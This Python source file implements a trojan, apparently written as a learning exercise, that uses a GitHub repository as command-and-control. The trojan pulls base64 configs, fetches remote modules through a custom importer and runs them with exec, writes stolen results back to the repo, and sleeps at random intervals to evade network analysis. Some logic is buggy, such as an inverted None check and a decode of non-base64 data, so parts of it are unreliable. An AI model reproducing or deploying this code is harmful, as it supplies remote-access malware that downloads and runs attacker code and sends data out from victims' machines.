import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

#function to connect to github
def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
        user = 'ericardiansa'
        sess = github3.login(token=token)
        return sess.repositories(user, 'Learn-Trojan')
#function to get file contents from repositories
def get_file_contents(dirname,module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

#create trojan class to performs trojaning task
#create trojan object
class Trojan:
    #function init
    def __init__(self,id):
        self.id = id
        #assign the configuration
        self.config_file = f'{id}.json'
        #assign where trojan will write its output
        self.data_path = f'data/{id}/'
        #make connection to repositori
        self.repo = github_connect()

    #function get configuration
    def get_config(self):
        #read config file
        config_json = get_file_contents(
            'config', self.config_file, self.repo
        )
        #load config data
        config = json.loads(base64.b64decode(config_json))

        #checking module
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config
    
    #create method
    def module_runner(self, module):
        #call the run function
        result = sys.modules[module].run()
        #call the store_module method with data from result
        self.store_module_result(result)

    # create file whose name includes the current date and time
    def store_module_result(self, data):
        message = datetime.now().isoformat()
        #create path
        remote_path = f'data/{self.id}/{message}.data'
        #save binary data
        binarydata = bytes('%r' % data, 'utf8')
        #save file to repo
        self.repo.create_file(
            remote_path, message, base64.b64decode(binarydata)
        )

    #executing the task
    def run(self):
        while True:
            #grab the config file
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)
                )
                thread.start()
                #sleep for random moments to foil
                #network pattern analysis
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30*60, 3*60*60))


#this class will be use when interpreter load a module
#that isnt available
class GitImporter:
    def __init__(self):
        self.current_module_code = ''

    def find_module(self, name, path=None):
        print("[*]Attempting to retreiving %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('module', f'{name}.py', self.repo)
        if new_library is None:
            self.current_module_code = base64.b64decode(new_library)
            return self
    
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module. __dict__)
        sys.modules[spec.name] = new_module
        return new_module
    


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()